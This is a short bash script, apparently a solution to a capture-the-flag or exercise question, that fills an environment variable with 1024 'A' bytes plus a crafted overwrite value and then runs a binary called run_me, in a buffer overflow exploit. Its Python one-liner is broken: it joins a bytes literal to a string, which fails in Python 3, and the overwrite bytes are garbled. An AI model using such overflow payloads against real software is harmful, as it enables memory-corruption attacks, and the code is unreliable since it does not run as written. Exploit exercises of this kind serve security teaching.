#!/bin/bash

export Q6_SECRET_CODE=$(python -c "import sys; sys.stdout.buffer.write(b'A' * 1024 + '\xef\xbe\xad\be')")
./run_me